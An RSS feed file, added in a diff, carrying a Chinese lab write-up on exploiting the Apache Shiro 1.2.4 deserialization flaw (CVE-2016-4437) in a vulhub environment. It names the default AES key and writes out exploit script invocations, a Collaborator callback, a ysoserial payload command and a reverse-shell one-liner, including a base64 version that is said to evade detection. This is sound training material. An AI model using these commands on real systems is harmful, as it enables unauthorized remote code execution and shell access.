@@ -1,0 +1,108 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>sqrt7 • Posts by &#34;靶场&#34; category</title>
+        <link>https://w-sqrt7.gitee.io</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Thu, 18 Apr 2024 23:31:13 +0800</pubDate>
+        <lastBuildDate>Thu, 18 Apr 2024 23:31:13 +0800</lastBuildDate>
+        <category>原创</category>
+        <category>逆向</category>
+        <category>C语言</category>
+        <category>misc</category>
+        <category>汇编</category>
+        <category>web</category>
+        <category>网基</category>
+        <category>eNSP</category>
+        <category>转载</category>
+        <category>信息安全</category>
+        <category>渗透</category>
+        <category>哲学</category>
+        <category>工具</category>
+        <category>基础</category>
+        <category>kali</category>
+        <category>靶场</category>
+        <category>vulhub</category>
+        <item>
+            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</guid>
+            <title>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</title>
+            <link>https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</link>
+            <category>原创</category>
+            <category>靶场</category>
+            <category>vulhub</category>
+            <pubDate>Thu, 18 Apr 2024 23:31:13 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;a href=&#34;#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;/a&gt;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&lt;/h1&gt;&lt;p&gt;​	Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。&lt;/p&gt;
+&lt;p&gt;​	Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，可以直接反序列化执行恶意代码。&lt;/strong&gt;而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;具体流程&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。&lt;/p&gt;
+&lt;p&gt;如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。&lt;/p&gt;
+&lt;p&gt;加密的过程是：用户信息&amp;#x3D;&amp;gt;序列化&amp;#x3D;&amp;gt;AES加密（密钥key）&amp;#x3D;&amp;gt;base64编码&amp;#x3D;&amp;gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &amp;#x3D;&amp;gt; Base64解码&amp;#x3D;&amp;gt;AES解密（密钥key）&amp;#x3D;&amp;gt;反序列化。&lt;/p&gt;
+&lt;p&gt;攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png&#34; alt=&#34;屏幕截图 2024-04-18 003118&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;影响版本&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Apache Shiro &amp;lt;&amp;#x3D;1.2.4&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;shiro特征&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。&lt;/p&gt;
+&lt;p&gt;判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&amp;#x3D;deleteMe字段。&lt;/p&gt;
+&lt;p&gt;如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&amp;#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png&#34; alt=&#34;屏幕截图 2024-04-17 234618&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a href=&#34;#漏洞验证&#34; class=&#34;headerlink&#34; title=&#34;漏洞验证&#34;&gt;&lt;/a&gt;漏洞验证&lt;/h2&gt;&lt;p&gt;利用脚本或工具进行验证&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -u http://192.168.100.134:8080&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png&#34; alt=&#34;image-20240418163349162&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png&#34; alt=&#34;image-20240418163332946&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png&#34; alt=&#34;image-20240418163611522&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，说明漏洞存在。&lt;/p&gt;
+&lt;p&gt;利用dnslog或collaborator进一步验证&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png&#34; alt=&#34;image-20240418185442068&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;目标任务：构造cookie获取反弹shell&lt;/p&gt;
+&lt;p&gt;nc开启监听，nc -lvvp 6666&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png&#34; alt=&#34;image-20240418170744863&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造反弹shell的命令&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/6666 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令中包含重定向 ’ &amp;lt; ’ ’ &amp;gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;利用序列化工具ysoserial.jar生成payload，并配置监听功能&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png&#34; alt=&#34;image-20240418183402795&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png&#34; alt=&#34;image-20240418183458178&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用脚本构造出cooikie信息&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro.py 192.168.100.131:7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png&#34; alt=&#34;image-20240418171624073&#34;&gt;&lt;/p&gt;
+&lt;p&gt;BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送&lt;/p&gt;
+&lt;p&gt;注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png&#34; alt=&#34;屏幕截图 2024-04-18 174103&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后回到kali发现获取到了shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png&#34; alt=&#34;image-20240418174311802&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png&#34; alt=&#34;image-20240418174424393&#34;&gt;&lt;/p&gt;
+&lt;p&gt;也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png&#34; alt=&#34;image-20240418185029472&#34;&gt;&lt;/p&gt;
+&lt;p&gt;或直接工具进行漏洞利用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png&#34; alt=&#34;屏幕截图 2024-04-18 223333&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png&#34; alt=&#34;image-20240418231659688&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png&#34; alt=&#34;屏幕截图 2024-04-18 223718&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png&#34; alt=&#34;屏幕截图 2024-04-18 223753&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;过程中遇见的问题以及解决方法&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;总体上，就是脚本运行的环境问题，环境不适配导致一系列报错&lt;/p&gt;
+&lt;p&gt;首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址&lt;a href=&#34;https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo&#34;&gt;https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo&lt;/a&gt; python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，然后使用pyhton2运行脚本即可。&lt;/p&gt;
+&lt;p&gt;然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;参考文章：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130173880&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130173880&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/372862.html&#34;&gt;https://www.freebuf.com/articles/web/372862.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44159028/article/details/115290013&#34;&gt;https://blog.csdn.net/qq_44159028/article/details/115290013&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
